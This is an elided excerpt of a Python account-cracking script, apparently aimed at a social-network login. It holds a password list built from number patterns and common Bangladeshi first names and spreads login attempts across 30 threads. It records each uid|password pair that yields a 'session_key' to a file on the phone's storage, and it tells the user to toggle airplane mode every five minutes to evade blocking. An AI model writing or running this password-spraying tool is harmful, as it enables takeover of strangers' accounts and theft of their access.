...
def random_number():
    ...
    pwx = ['first7digit','last7digit','first6digit','last6digit','fullnumber','first8digit','last8digit','101010','202020','303030','404040','505050','606060','707070','808080','909090','111222','sadiya','sumaiya','fariya','Bangladesh','Sadiya','Sumaiya','full_number','Fariya','sadiya1234','fariya1234','sumaiya1234','mim1234','bangladesh1234','Nafisa','nafisa','nafisa1234']
...
def file_crack():
    ...
    with ThreadPool(max_workers=30) as BilalHaiderID:
        ...
        print(f" {green}[*]{red}    USE AIRPLANE MODE IN EVERY 5MIN ")
        print(50*'-')
    ...
    try:
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    print(f'\r{green}[DARK-OK] {uidX} | {pw} {white}')
                    open('/sdcard/DARK-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
    ...
    try:
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uid not in oks:
                    print(f'\r{green}[DARK-OK] {uid} | {pw} {white}')
